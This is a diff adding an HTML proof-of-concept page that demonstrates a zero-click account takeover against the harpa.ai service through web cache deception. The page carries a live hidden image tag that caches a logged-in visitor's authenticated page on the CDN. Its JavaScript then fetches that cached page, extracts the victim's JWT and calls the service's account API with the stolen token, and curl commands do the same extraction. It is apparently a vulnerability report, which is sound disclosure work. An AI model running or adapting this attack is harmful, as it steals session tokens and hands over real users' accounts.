@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>HARPA AI - Zero-Click Account Takeover via Web Cache Deception</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
+  h1 { color: #e94560; }
+  h2 { color: #ff0; margin-top: 20px; }
+  pre { background: #16213e; padding: 15px; word-break: break-all; border: 1px solid #0f3460; overflow-x: auto; }
+  .step { margin: 15px 0; padding: 10px; border-left: 3px solid #e94560; }
+  .success { color: #0f0; font-weight: bold; }
+  .fail { color: #e94560; }
+  button { background: #e94560; color: #fff; border: none; padding: 10px 20px; cursor: pointer; font-family: monospace; font-size: 14px; margin: 5px; }
+  button:hover { background: #ff6b8a; }
+  #results { margin-top: 20px; }
+  .info { color: #888; font-size: 12px; }
+</style>
+</head>
+<body>
+
+<h1>HARPA AI - Zero-Click Account Takeover</h1>
+<h2>Vulnerability: Web Cache Deception (WCD)</h2>
+
+<div class="step">
+  <p><strong>Attack Vector:</strong> Cloudflare CDN caches authenticated HTML responses when a static file extension is appended to library page URLs.</p>
+  <p><strong>Impact:</strong> Any logged-in harpa.ai user who loads a poisoned URL (via &lt;img&gt;, &lt;link&gt;, or iframe on any website) has their JWT token cached on Cloudflare's CDN. The attacker then fetches the cached page to steal the JWT.</p>
+  <p><strong>Zero-Click:</strong> No user interaction required. The poisoned URL can be embedded as a hidden resource on any webpage.</p>
+</div>
+
+<h2>Step 1: Poison the victim's cache (simulated)</h2>
+<p>In a real attack, this would be an invisible &lt;img&gt; tag on any website the victim visits:</p>
+<pre>&lt;img src="https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" style="display:none"&gt;</pre>
+
+<p>Or a CSS preload:</p>
+<pre>&lt;link rel="prefetch" href="https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css"&gt;</pre>
+
+<!-- This invisible image triggers the victim's browser to request the .css URL with their harpa.ai cookies -->
+<img src="https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" style="display:none" id="poisonTrigger">
+
+<div id="step1status" class="step">Waiting for victim cache poisoning...</div>
+
+<h2>Step 2: Attacker retrieves cached JWT</h2>
+<button onclick="fetchCachedJWT()">Fetch Cached Response (Attacker View)</button>
+
+<div id="results"></div>
+
+<script>
+// Step 1 completes automatically when the img loads
+document.getElementById('poisonTrigger').onload = function() {
+  document.getElementById('step1status').innerHTML = '<span class="success">✓ Cache poisoned! Victim\'s browser loaded the URL with their cookies.</span>';
+};
+document.getElementById('poisonTrigger').onerror = function() {
+  document.getElementById('step1status').innerHTML = '<span class="success">✓ Request sent (img onerror is expected for HTML content-type). Cache should be poisoned.</span>';
+};
+
+// Step 2: Attacker fetches the cached response
+async function fetchCachedJWT() {
+  const resultsDiv = document.getElementById('results');
+  resultsDiv.innerHTML = '<p>Fetching cached response from Cloudflare CDN...</p>';
+
+  try {
+    // Fetch WITHOUT credentials - this simulates the attacker's request
+    const resp = await fetch('https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css', {
+      credentials: 'omit',  // No cookies sent = attacker perspective
+      cache: 'no-store'     // Bypass browser cache, hit CDN directly
+    });
+
+    const html = await resp.text();
+    const cfCache = resp.headers.get('cf-cache-status');
+    const age = resp.headers.get('age');
+
+    // Extract JWT from __NEXT_DATA__
+    const match = html.match(/"jwt":"([^"]+)"/);
+
+    if (match) {
+      const jwt = match[1];
+      const parts = jwt.split('.');
+      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+
+      // Verify the JWT works by calling the API
+      let accountData = null;
+      try {
+        const acctResp = await fetch('https://api.harpa.ai/api/v1/auth/account?withBalanceAggregated=true', {
+          headers: {
+            'Authorization': 'Bearer ' + jwt,
+            'Content-Type': 'application/json'
+          }
+        });
+        accountData = await acctResp.json();
+      } catch(e) {}
+
+      resultsDiv.innerHTML = `
+        <h2 style="color:#0f0">ZERO-CLICK ACCOUNT TAKEOVER SUCCESSFUL</h2>
+        <p>cf-cache-status: <strong>${cfCache}</strong> | age: ${age}s</p>
+
+        <h3 style="color:#e94560">Stolen JWT Token:</h3>
+        <pre style="color:#e94560">${jwt}</pre>
+
+        <h3>Decoded JWT Payload:</h3>
+        <pre style="color:#0f0">${JSON.stringify(payload, null, 2)}</pre>
+
+        <h3>Account Data (fetched using stolen JWT):</h3>
+        <pre style="color:#0f0">${accountData ? JSON.stringify(accountData, null, 2) : 'CORS blocked from this origin - use curl to verify'}</pre>
+
+        <h3 style="color:#ff0">Attack Summary:</h3>
+        <div class="step">
+          <p>1. Victim visited a page containing hidden &lt;img src="...library/x/y.css"&gt;</p>
+          <p>2. Browser sent request WITH harpa.ai cookies (JWT in cookie)</p>
+          <p>3. Server rendered page with JWT in __NEXT_DATA__ JSON</p>
+          <p>4. Cloudflare cached the response (treating .css as static asset)</p>
+          <p>5. Attacker fetched same URL WITHOUT cookies → got victim's JWT</p>
+          <p>6. JWT used to access victim's full account via API</p>
+        </div>
+
+        <p class="info">Cache TTL: s-maxage=3600 (1 hour on CDN), max-age=432000 (5 days browser cache)</p>
+        <p class="info">Working extensions: .css, .js, .png, .ico</p>
+      `;
+    } else {
+      resultsDiv.innerHTML = `
+        <p class="fail">JWT not found in cached response.</p>
+        <p>cf-cache-status: ${cfCache} | age: ${age}</p>
+        <p>This may mean:</p>
+        <ul>
+          <li>Cache has expired (TTL is 1 hour)</li>
+          <li>No authenticated user has visited this URL yet</li>
+          <li>CORS is blocking the response body (try with curl instead)</li>
+        </ul>
+        <p class="info">Curl command to verify: curl -s "https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" | grep -o '"jwt":"[^"]*"'</p>
+      `;
+    }
+  } catch(e) {
+    resultsDiv.innerHTML = `<p class="fail">Error: ${e.message}</p><p>CORS may block browser-based fetch. Use curl to verify:</p><pre>curl -s "https://harpa.ai/library/deep-research-bot/6728a0a922b006c16f7f44e5.css" | grep -o '"jwt":"[^"]*"'</pre>`;
+  }
+}
+</script>
+
+</body>
+</html>
